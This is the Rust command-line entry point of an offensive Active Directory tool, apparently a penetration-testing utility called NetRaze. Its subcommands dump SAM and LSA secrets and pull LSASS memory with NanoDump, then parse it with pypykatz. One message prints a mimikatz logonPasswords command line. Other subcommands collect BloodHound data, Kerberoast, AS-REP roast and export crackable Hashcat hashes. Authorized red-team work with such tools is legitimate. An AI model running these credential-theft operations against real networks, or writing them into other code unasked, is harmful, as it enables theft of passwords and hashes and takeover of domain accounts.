use anyhow::Result;
use clap::{Args, Parser, Subcommand};
use netraze_app::NetRazeApp;
use netraze_config::AppConfig;
use netraze_core::ScanRequest;
use netraze_protocols::kerberos::{
    KerberosAssessmentOutcome, KerberosAssessmentTargets, KerberosClient, KerberosClientConfig,
    KerberosCredential, RoastArtifact, ServicePrincipalTarget, targets_from_inventory,
};
use netraze_protocols::ldap::{
    BloodHoundCeExportOptions, BloodHoundCeProgress, LdapAuthentication, LdapClientConfig,
    collect_and_export_ce_with_progress, inventory,
};
use netraze_protocols::ntlm::NtlmCredential;
use netraze_protocols::smb::{remote_lsass_dump, secrets_dump, secrets_dump_nanodump};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use tracing_subscriber::EnvFilter;

#[derive(Debug, Parser)]
#[command(name = "netraze", about = "CLI Rust de NetRaze")]
struct Cli {
    #[command(subcommand)]
    command: Command,
}

#[derive(Debug, Subcommand)]
enum Command {
    Protocols,
    Modules,
    Plan {
        protocol: String,
        #[arg(required = true)]
        targets: Vec<String>,
        #[arg(long)]
        module: Option<String>,
    },
    /// Dump SAM hashes + LSA secrets from a remote target.
    /// Add --nanodump <binary> to use NanoDump for LSASS instead of registry.
    SecretsDump {
        target: String,
        #[arg(short, long)]
        username: String,
        #[arg(short, long)]
        password: String,
        #[arg(short, long)]
        domain: Option<String>,
        /// Use NanoDump for LSASS: path to nanodump.x64.exe.
        #[arg(long)]
        nanodump: Option<PathBuf>,
        /// Where to save the LSASS .dmp (only with --nanodump).
        #[arg(long, default_value = "lsass.dmp")]
        dmp_out: PathBuf,
        /// NanoDump technique: fork, dup, snapshot, spoof-callstack…
        #[arg(long, default_value = "fork")]
        technique: String,
    },
    /// Standalone LSASS minidump via NanoDump (no SAM/registry).
    LsassDump {
        target: String,
        #[arg(short, long)]
        username: String,
        #[arg(short, long)]
        password: String,
        #[arg(short, long)]
        domain: Option<String>,
        /// Path to the NanoDump binary.
        #[arg(long)]
        binary: PathBuf,
        /// Where to save the downloaded .dmp file.
        #[arg(long, default_value = "lsass.dmp")]
        output: PathBuf,
        /// NanoDump technique: fork, dup, snapshot…
        #[arg(long, default_value = "fork")]
        technique: String,
    },
    /// Collect LDAP relationships and export BloodHound Community Edition schema-v6 data.
    BloodhoundCe {
        /// Domain controller address, with optional port (defaults to 389).
        #[arg(long)]
        endpoint: String,
        /// NTLM domain supplied during LDAP SASL authentication.
        #[arg(short, long)]
        domain: String,
        #[arg(short, long)]
        username: String,
        /// Name of an environment variable containing the password.
        #[arg(
            long,
            value_name = "ENV",
            required_unless_present = "nt_hash_env",
            conflicts_with = "nt_hash_env"
        )]
        password_env: Option<String>,
        /// Name of an environment variable containing a 32-character NT hash.
        #[arg(
            long,
            value_name = "ENV",
            required_unless_present = "password_env",
            conflicts_with = "password_env"
        )]
        nt_hash_env: Option<String>,
        /// Directory for loose JSON files and the ZIP archive.
        #[arg(short, long, default_value = "bloodhound-ce")]
        output: PathBuf,
    },
    /// Assess Kerberos authentication and ticket exposure against an authorized AD KDC.
    Kerberos {
        #[command(subcommand)]
        command: KerberosCommand,
    },
}

#[derive(Debug, Subcommand)]
enum KerberosCommand {
    /// Acquire and validate a TGT without saving it to disk.
    Tgt {
        #[command(flatten)]
        target: KerberosTargetArgs,
        #[arg(short, long)]
        username: String,
        #[command(flatten)]
        secret: KerberosSecretArgs,
    },
    /// Find users for whom the KDC returns an AS-REP without pre-authentication.
    AsrepRoast {
        #[command(flatten)]
        target: KerberosTargetArgs,
        /// Principal to assess; may be repeated.
        #[arg(long = "user")]
        users: Vec<String>,
        /// Newline-delimited principal file. Blank and `#` lines are ignored.
        #[arg(long)]
        users_file: Option<PathBuf>,
        /// Optional LDAP endpoint used to discover pre-auth-disabled users.
        #[arg(long)]
        ldap_endpoint: Option<String>,
        #[arg(long, requires = "ldap_endpoint")]
        ldap_domain: Option<String>,
        #[arg(long, requires = "ldap_endpoint")]
        ldap_username: Option<String>,
        #[arg(
            long,
            value_name = "ENV",
            requires = "ldap_endpoint",
            conflicts_with = "ldap_nt_hash_env"
        )]
        ldap_password_env: Option<String>,
        #[arg(
            long,
            value_name = "ENV",
            requires = "ldap_endpoint",
            conflicts_with = "ldap_password_env"
        )]
        ldap_nt_hash_env: Option<String>,
        /// Explicit destination for Hashcat-compatible output.
        #[arg(short, long)]
        output: Option<PathBuf>,
    },
    /// Request service tickets for explicit or LDAP-discovered SPNs.
    Kerberoast {
        #[command(flatten)]
        target: KerberosTargetArgs,
        #[arg(short, long)]
        username: String,
        #[command(flatten)]
        secret: KerberosSecretArgs,
        /// `ACCOUNT=service/instance` target; may be repeated.
        #[arg(long = "spn")]
        spns: Vec<String>,
        /// File containing one `ACCOUNT<TAB>service/instance` target per line.
        #[arg(long)]
        spns_file: Option<PathBuf>,
        /// Optional LDAP endpoint used to discover user and managed-service SPNs.
        #[arg(long)]
        ldap_endpoint: Option<String>,
        /// NTLM domain for LDAP discovery; required with `--ldap-endpoint`.
        #[arg(long, requires = "ldap_endpoint")]
        ldap_domain: Option<String>,
        /// Explicit destination for Hashcat-compatible output.
        #[arg(short, long)]
        output: Option<PathBuf>,
    },
}

#[derive(Debug, Args)]
struct KerberosTargetArgs {
    /// KDC address with optional TCP port (defaults to 88).
    #[arg(long)]
    kdc: String,
    /// Kerberos realm, for example EXAMPLE.TEST.
    #[arg(long)]
    realm: String,
}

#[derive(Debug, Args)]
#[group(required = true, multiple = false)]
struct KerberosSecretArgs {
    #[arg(long, value_name = "ENV", conflicts_with_all = ["nt_hash_env", "aes128_key_env", "aes256_key_env"])]
    password_env: Option<String>,
    #[arg(long, value_name = "ENV", conflicts_with_all = ["password_env", "aes128_key_env", "aes256_key_env"])]
    nt_hash_env: Option<String>,
    #[arg(long, value_name = "ENV", conflicts_with_all = ["password_env", "nt_hash_env", "aes256_key_env"])]
    aes128_key_env: Option<String>,
    #[arg(long, value_name = "ENV", conflicts_with_all = ["password_env", "nt_hash_env", "aes128_key_env"])]
    aes256_key_env: Option<String>,
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .without_time()
        .init();

    let cli = Cli::parse();
    let app = NetRazeApp::bootstrap(AppConfig::default());

    match cli.command {
        Command::Protocols => {
            for protocol in app.protocol_catalog() {
                println!(
                    "{} ({}) port {}",
                    protocol.display_name, protocol.key, protocol.default_port
                );
            }
        }
        Command::Modules => {
            for module in app.module_catalog() {
                println!("{} [{}]", module.key, module.supported_protocols.join(", "));
            }
        }
        Command::Plan {
            protocol,
            targets,
            module,
        } => {
            let plan = app
                .plan_scan(ScanRequest {
                    protocol,
                    raw_targets: targets,
                    selected_module: module,
                    options: BTreeMap::new(),
                })
                .await?;
            println!(
                "plan: protocol={} targets={} threads={} timeout={}s",
                plan.request.protocol,
                plan.request.raw_targets.len(),
                plan.concurrency,
                plan.timeout_seconds
            );
        }

        Command::SecretsDump {
            target,
            username,
            password,
            domain,
            nanodump,
            dmp_out,
            technique,
        } => {
            match nanodump {
                None => {
                    // Classic registry-based dump.
                    secrets_dump(&target, &username, &password, domain.as_deref())
                        .await
                        .map_err(|e| anyhow::anyhow!(e))?;
                }
                Some(binary_path) => {
                    // NanoDump path: SAM via registry + LSASS via NanoDump.
                    let nanodump_bytes = std::fs::read(&binary_path).map_err(|e| {
                        anyhow::anyhow!("cannot read {}: {e}", binary_path.display())
                    })?;
                    println!(
                        "[*] NanoDump binary: {} ({} bytes)",
                        binary_path.display(),
                        nanodump_bytes.len()
                    );

                    let dump_bytes = secrets_dump_nanodump(
                        &target,
                        &username,
                        &password,
                        domain.as_deref(),
                        &nanodump_bytes,
                        &technique,
                        &|line| println!("[nanodump] {line}"),
                    )
                    .await
                    .map_err(|e| anyhow::anyhow!(e))?;

                    // Save the minidump.
                    std::fs::write(&dmp_out, &dump_bytes)
                        .map_err(|e| anyhow::anyhow!("cannot write {}: {e}", dmp_out.display()))?;
                    println!("[+] Minidump saved → {}", dmp_out.display());

                    // Try to auto-parse with pypykatz.
                    parse_with_pypykatz(&dmp_out);
                }
            }
        }

        Command::LsassDump {
            target,
            username,
            password,
            domain,
            binary,
            output,
            technique,
        } => {
            let nanodump_bytes = std::fs::read(&binary)
                .map_err(|e| anyhow::anyhow!("cannot read {}: {e}", binary.display()))?;
            println!(
                "[*] NanoDump binary: {} ({} bytes)",
                binary.display(),
                nanodump_bytes.len()
            );
            let cred = netraze_protocols::smb::SmbCredential::new(
                &username,
                domain.as_deref().unwrap_or(""),
                &password,
            );
            let technique_flag = format!("--{technique}");
            let result =
                remote_lsass_dump(&target, &cred, &nanodump_bytes, &technique_flag, &|line| {
                    println!("[nanodump] {line}")
                })
                .await
                .map_err(|e| anyhow::anyhow!(e))?;

            std::fs::write(&output, &result.dump_bytes)
                .map_err(|e| anyhow::anyhow!("cannot write {}: {e}", output.display()))?;
            println!("[+] {} → {}", result.summary, output.display());
            parse_with_pypykatz(&output);
        }
        Command::BloodhoundCe {
            endpoint,
            domain,
            username,
            password_env,
            nt_hash_env,
            output,
        } => {
            let credential = credential_from_environment(password_env, nt_hash_env)?;
            let artifacts = collect_and_export_ce_with_progress(
                LdapClientConfig::new(endpoint),
                LdapAuthentication::Ntlm {
                    username,
                    domain,
                    credential,
                },
                BloodHoundCeExportOptions::new(&output),
                print_bloodhound_progress,
            )
            .await?;
            println!(
                "[+] Exported {} graph objects for {} into {} JSON files",
                artifacts.exported_object_count,
                artifacts.domain,
                artifacts.json_files.len()
            );
            println!("[+] ZIP archive: {}", artifacts.zip_file.display());
            if !artifacts.referrals.is_empty() {
                println!(
                    "[!] LDAP returned {} referral(s); they were reported but not followed",
                    artifacts.referrals.len()
                );
            }
        }
        Command::Kerberos { command } => run_kerberos(command).await?,
    }

    Ok(())
}

async fn run_kerberos(command: KerberosCommand) -> Result<()> {
    match command {
        KerberosCommand::Tgt {
            target,
            username,
            secret,
        } => {
            let loaded = kerberos_credential_from_environment(&secret)?;
            let client = kerberos_client(target)?;
            let tgt = client.request_tgt(&username, &loaded.kerberos).await?;
            println!(
                "[+] TGT validated for {}@{} using {} (valid until Unix {})",
                tgt.client_principal(),
                tgt.realm(),
                tgt.session_encryption_type(),
                tgt.valid_until_unix()
            );
        }
        KerberosCommand::AsrepRoast {
            target,
            mut users,
            users_file,
            ldap_endpoint,
            ldap_domain,
            ldap_username,
            ldap_password_env,
            ldap_nt_hash_env,
            output,
        } => {
            if let Some(path) = users_file {
                users.extend(read_lines_bounded(&path)?);
            }
            if let Some(endpoint) = ldap_endpoint {
                let domain = ldap_domain.ok_or_else(|| {
                    anyhow::anyhow!("--ldap-domain is required with --ldap-endpoint")
                })?;
                let username = ldap_username.ok_or_else(|| {
                    anyhow::anyhow!("--ldap-username is required with --ldap-endpoint")
                })?;
                let credential = credential_from_environment(ldap_password_env, ldap_nt_hash_env)?;
                let inventory = inventory(
                    LdapClientConfig::new(endpoint),
                    &username,
                    &domain,
                    credential,
                )
                .await?;
                users.extend(targets_from_inventory(&inventory).as_rep_principals);
            }
            let mut targets = KerberosAssessmentTargets {
                as_rep_principals: users,
                service_principals: Vec::new(),
            };
            targets.normalize()?;
            if targets.as_rep_principals.is_empty() {
                return Err(anyhow::anyhow!(
                    "provide --user, --users-file, or LDAP discovery targets"
                ));
            }
            let client = kerberos_client(target)?;
            let outcome = client.assess_as_rep(&targets.as_rep_principals).await?;
            report_kerberos_outcome(&outcome);
            if let Some(path) = output {
                export_roast_artifacts(&path, &outcome.artifacts)?;
                println!(
                    "[+] Exported {} artifact(s) to {}",
                    outcome.artifacts.len(),
                    path.display()
                );
            }
        }
        KerberosCommand::Kerberoast {
            target,
            username,
            secret,
            spns,
            spns_file,
            ldap_endpoint,
            ldap_domain,
            output,
        } => {
            let loaded = kerberos_credential_from_environment(&secret)?;
            let mut service_principals = spns
                .iter()
                .map(|value| parse_inline_spn(value))
                .collect::<Result<Vec<_>>>()?;
            if let Some(path) = spns_file {
                service_principals.extend(
                    read_lines_bounded(&path)?
                        .iter()
                        .map(|value| parse_file_spn(value))
                        .collect::<Result<Vec<_>>>()?,
                );
            }
            if let Some(endpoint) = ldap_endpoint {
                let domain = ldap_domain.ok_or_else(|| {
                    anyhow::anyhow!("--ldap-domain is required with --ldap-endpoint")
                })?;
                let ldap_credential = loaded.ldap.clone().ok_or_else(|| anyhow::anyhow!(
                    "LDAP discovery requires a password or NT hash; use explicit SPNs with an AES-only credential"
                ))?;
                let directory = inventory(
                    LdapClientConfig::new(endpoint),
                    &username,
                    &domain,
                    ldap_credential,
                )
                .await?;
                service_principals.extend(targets_from_inventory(&directory).service_principals);
            }
            let mut targets = KerberosAssessmentTargets {
                as_rep_principals: Vec::new(),
                service_principals,
            };
            targets.normalize()?;
            if targets.service_principals.is_empty() {
                return Err(anyhow::anyhow!(
                    "provide --spn, --spns-file, or LDAP discovery targets"
                ));
            }
            let client = kerberos_client(target)?;
            let tgt = client.request_tgt(&username, &loaded.kerberos).await?;
            let outcome = client
                .assess_spns(&tgt, &targets.service_principals)
                .await?;
            report_kerberos_outcome(&outcome);
            if let Some(path) = output {
                export_roast_artifacts(&path, &outcome.artifacts)?;
                println!(
                    "[+] Exported {} artifact(s) to {}",
                    outcome.artifacts.len(),
                    path.display()
                );
            }
        }
    }
    Ok(())
}

fn kerberos_client(target: KerberosTargetArgs) -> Result<KerberosClient> {
    KerberosClient::connect(KerberosClientConfig::new(target.kdc, target.realm))
        .map_err(anyhow::Error::from)
}

struct LoadedKerberosCredential {
    kerberos: KerberosCredential,
    ldap: Option<NtlmCredential>,
}

fn kerberos_credential_from_environment(
    args: &KerberosSecretArgs,
) -> Result<LoadedKerberosCredential> {
    let selected = [
        args.password_env.as_ref(),
        args.nt_hash_env.as_ref(),
        args.aes128_key_env.as_ref(),
        args.aes256_key_env.as_ref(),
    ]
    .into_iter()
    .flatten()
    .count();
    if selected != 1 {
        return Err(anyhow::anyhow!(
            "provide exactly one of --password-env, --nt-hash-env, --aes128-key-env, or --aes256-key-env"
        ));
    }
    if let Some(name) = &args.password_env {
        let value = required_secret_environment(name)?;
        return Ok(LoadedKerberosCredential {
            kerberos: KerberosCredential::Password(value.clone()),
            ldap: Some(NtlmCredential::Password(value)),
        });
    }
    if let Some(name) = &args.nt_hash_env {
        let value = required_secret_environment(name)?;
        return Ok(LoadedKerberosCredential {
            kerberos: KerberosCredential::from_nt_hash_hex(&value)?,
            ldap: Some(NtlmCredential::from_nt_hash_hex(&value)?),
        });
    }
    if let Some(name) = &args.aes128_key_env {
        return Ok(LoadedKerberosCredential {
            kerberos: KerberosCredential::from_aes128_hex(&required_secret_environment(name)?)?,
            ldap: None,
        });
    }
    let name = args
        .aes256_key_env
        .as_ref()
        .expect("exactly one secret source was counted");
    Ok(LoadedKerberosCredential {
        kerberos: KerberosCredential::from_aes256_hex(&required_secret_environment(name)?)?,
        ldap: None,
    })
}

fn required_secret_environment(name: &str) -> Result<String> {
    std::env::var(name)
        .map_err(|_| anyhow::anyhow!("credential environment variable {name} is not set"))
}

const MAX_TARGET_FILE_SIZE: u64 = 1024 * 1024;
const MAX_TARGET_FILE_LINES: usize = 50_000;

fn read_lines_bounded(path: &Path) -> Result<Vec<String>> {
    let metadata = std::fs::metadata(path)
        .map_err(|error| anyhow::anyhow!("cannot inspect {}: {error}", path.display()))?;
    if metadata.len() > MAX_TARGET_FILE_SIZE {
        return Err(anyhow::anyhow!(
            "target file {} exceeds the 1 MiB limit",
            path.display()
        ));
    }
    let contents = std::fs::read_to_string(path)
        .map_err(|error| anyhow::anyhow!("cannot read {}: {error}", path.display()))?;
    let lines = contents
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .map(str::to_owned)
        .collect::<Vec<_>>();
    if lines.len() > MAX_TARGET_FILE_LINES {
        return Err(anyhow::anyhow!(
            "target file {} exceeds the {MAX_TARGET_FILE_LINES}-entry limit",
            path.display()
        ));
    }
    Ok(lines)
}

fn parse_inline_spn(value: &str) -> Result<ServicePrincipalTarget> {
    let (account, spn) = value
        .split_once('=')
        .ok_or_else(|| anyhow::anyhow!("SPN target must use ACCOUNT=service/instance syntax"))?;
    ServicePrincipalTarget::new(account.trim(), spn.trim()).map_err(anyhow::Error::from)
}

fn parse_file_spn(value: &str) -> Result<ServicePrincipalTarget> {
    let (account, spn) = value.split_once('\t').ok_or_else(|| {
        anyhow::anyhow!("SPN file entries must use ACCOUNT<TAB>service/instance syntax")
    })?;
    ServicePrincipalTarget::new(account.trim(), spn.trim()).map_err(anyhow::Error::from)
}

fn report_kerberos_outcome(outcome: &KerberosAssessmentOutcome) {
    for finding in &outcome.findings {
        if let Some(spn) = &finding.service_principal_name {
            println!(
                "[+] Kerberoastable: {} ({spn}, etype {}, hashcat mode {})",
                finding.principal, finding.encryption_type, finding.hashcat_mode
            );
        } else {
            println!(
                "[+] AS-REP roastable: {} (etype {}, hashcat mode {})",
                finding.principal, finding.encryption_type, finding.hashcat_mode
            );
        }
    }
    for error in &outcome.errors {
        eprintln!("[!] {}: {}", error.target, error.message);
    }
    println!(
        "[*] Kerberos assessment complete: {} finding(s), {} error(s)",
        outcome.findings.len(),
        outcome.errors.len()
    );
}

fn export_roast_artifacts(path: &Path, artifacts: &[RoastArtifact]) -> Result<()> {
    use std::io::Write;

    let mut options = std::fs::OpenOptions::new();
    options.write(true).create(true).truncate(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    let mut file = options
        .open(path)
        .map_err(|error| anyhow::anyhow!("cannot create {}: {error}", path.display()))?;
    #[cfg(unix)]
    std::fs::set_permissions(path, std::os::unix::fs::PermissionsExt::from_mode(0o600))
        .map_err(|error| anyhow::anyhow!("cannot protect {}: {error}", path.display()))?;
    for artifact in artifacts {
        writeln!(file, "{}", artifact.hashcat_line())
            .map_err(|error| anyhow::anyhow!("cannot write {}: {error}", path.display()))?;
    }
    file.flush()
        .map_err(|error| anyhow::anyhow!("cannot flush {}: {error}", path.display()))?;
    Ok(())
}

fn credential_from_environment(
    password_env: Option<String>,
    nt_hash_env: Option<String>,
) -> Result<NtlmCredential> {
    match (password_env, nt_hash_env) {
        (Some(name), None) => std::env::var(&name)
            .map(NtlmCredential::Password)
            .map_err(|_| anyhow::anyhow!("credential environment variable {name} is not set")),
        (None, Some(name)) => {
            let hash = std::env::var(&name).map_err(|_| {
                anyhow::anyhow!("credential environment variable {name} is not set")
            })?;
            NtlmCredential::from_nt_hash_hex(&hash).map_err(anyhow::Error::from)
        }
        _ => Err(anyhow::anyhow!(
            "provide exactly one of --password-env or --nt-hash-env"
        )),
    }
}

fn print_bloodhound_progress(progress: BloodHoundCeProgress) {
    match progress {
        BloodHoundCeProgress::Connecting => println!("[*] Connecting to LDAP"),
        BloodHoundCeProgress::Binding => println!("[*] Authenticating with NTLM SASL"),
        BloodHoundCeProgress::Collecting => println!("[*] Collecting directory records"),
        BloodHoundCeProgress::Parsing { ldap_entries } => {
            println!("[*] Building the CE graph from {ldap_entries} LDAP records");
        }
        BloodHoundCeProgress::Writing { graph_objects } => {
            println!("[*] Writing {graph_objects} graph objects");
        }
        BloodHoundCeProgress::Complete { json_files } => {
            println!("[*] Finished {json_files} JSON collections");
        }
    }
}

/// Try to parse a minidump with pypykatz and print the output.
/// Tries the `pypykatz` command first, then `python -m pypykatz`.
/// Non-fatal: if pypykatz is unavailable, we just tell the user how to parse.
fn parse_with_pypykatz(dmp_path: &Path) {
    let path_str = match dmp_path.to_str() {
        Some(s) => s.to_owned(),
        None => return,
    };

    println!("[*] Trying pypykatz auto-parse...");

    // Attempt 1: pypykatz in PATH.
    let r1 = std::process::Command::new("pypykatz")
        .args(["lsa", "minidump", &path_str])
        .output();

    if let Ok(out) = r1 {
        if out.status.success() || !out.stdout.is_empty() {
            println!("{}", String::from_utf8_lossy(&out.stdout));
            if !out.stderr.is_empty() {
                eprintln!("{}", String::from_utf8_lossy(&out.stderr));
            }
            return;
        }
    }

    // Attempt 2: python -m pypykatz.
    let r2 = std::process::Command::new("python")
        .args(["-m", "pypykatz", "lsa", "minidump", &path_str])
        .output();

    if let Ok(out) = r2 {
        if out.status.success() || !out.stdout.is_empty() {
            println!("{}", String::from_utf8_lossy(&out.stdout));
            if !out.stderr.is_empty() {
                eprintln!("{}", String::from_utf8_lossy(&out.stderr));
            }
            return;
        }
    }

    println!(
        "[!] pypykatz not found — parse manually:\n    \
         pypykatz lsa minidump {path_str}\n    \
         mimikatz.exe \"sekurlsa::minidump {path_str}\" \"sekurlsa::logonPasswords full\" exit"
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn bloodhound_cli_requires_exactly_one_secret_environment_variable() {
        let base = [
            "netraze",
            "bloodhound-ce",
            "--endpoint",
            "dc.example.test",
            "--domain",
            "EXAMPLE",
            "--username",
            "alice",
        ];
        assert!(Cli::try_parse_from(base).is_err());

        let mut both = base.to_vec();
        both.extend([
            "--password-env",
            "NETRAZE_PASSWORD",
            "--nt-hash-env",
            "NETRAZE_NT_HASH",
        ]);
        assert!(Cli::try_parse_from(both).is_err());

        let mut password = base.to_vec();
        password.extend(["--password-env", "NETRAZE_PASSWORD"]);
        assert!(Cli::try_parse_from(password).is_ok());
    }

    #[test]
    fn kerberos_cli_requires_one_environment_secret_and_accepts_explicit_targets() {
        let base = [
            "netraze",
            "kerberos",
            "tgt",
            "--kdc",
            "dc.example.test",
            "--realm",
            "EXAMPLE.TEST",
            "--username",
            "alice",
        ];
        assert!(Cli::try_parse_from(base).is_err());

        let mut password = base.to_vec();
        password.extend(["--password-env", "NETRAZE_KRB_PASSWORD"]);
        assert!(Cli::try_parse_from(password).is_ok());

        let mut conflicting = base.to_vec();
        conflicting.extend([
            "--password-env",
            "NETRAZE_KRB_PASSWORD",
            "--nt-hash-env",
            "NETRAZE_KRB_NT_HASH",
        ]);
        assert!(Cli::try_parse_from(conflicting).is_err());

        assert!(
            Cli::try_parse_from([
                "netraze",
                "kerberos",
                "asrep-roast",
                "--kdc",
                "dc.example.test",
                "--realm",
                "EXAMPLE.TEST",
                "--user",
                "asrep-user",
            ])
            .is_ok()
        );
        assert!(
            Cli::try_parse_from([
                "netraze",
                "kerberos",
                "kerberoast",
                "--kdc",
                "dc.example.test",
                "--realm",
                "EXAMPLE.TEST",
                "--username",
                "alice",
                "--password-env",
                "NETRAZE_KRB_PASSWORD",
                "--spn",
                "svc-web=HTTP/web.example.test",
            ])
            .is_ok()
        );
    }

    #[test]
    fn target_parsers_ignore_comments_and_require_account_mapping() {
        let path = std::env::temp_dir().join(format!(
            "netraze-kerberos-targets-{}-{}.txt",
            std::process::id(),
            std::thread::current().name().unwrap_or("test")
        ));
        std::fs::write(&path, "# comment\n\nalice\n bob \n").unwrap();
        let lines = read_lines_bounded(&path).unwrap();
        std::fs::remove_file(&path).unwrap();
        assert_eq!(lines, ["alice", "bob"]);
        assert!(parse_inline_spn("svc=HTTP/web").is_ok());
        assert!(parse_inline_spn("HTTP/web").is_err());
        assert!(parse_file_spn("svc\tHTTP/web").is_ok());
        assert!(parse_file_spn("svc=HTTP/web").is_err());
    }

    #[test]
    fn explicit_export_creates_a_private_file_without_implicit_content() {
        let path = std::env::temp_dir().join(format!(
            "netraze-kerberos-export-{}.txt",
            std::process::id()
        ));
        export_roast_artifacts(&path, &[]).unwrap();
        assert!(std::fs::read(&path).unwrap().is_empty());
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(
                std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
                0o600
            );
        }
        std::fs::remove_file(path).unwrap();
    }
}
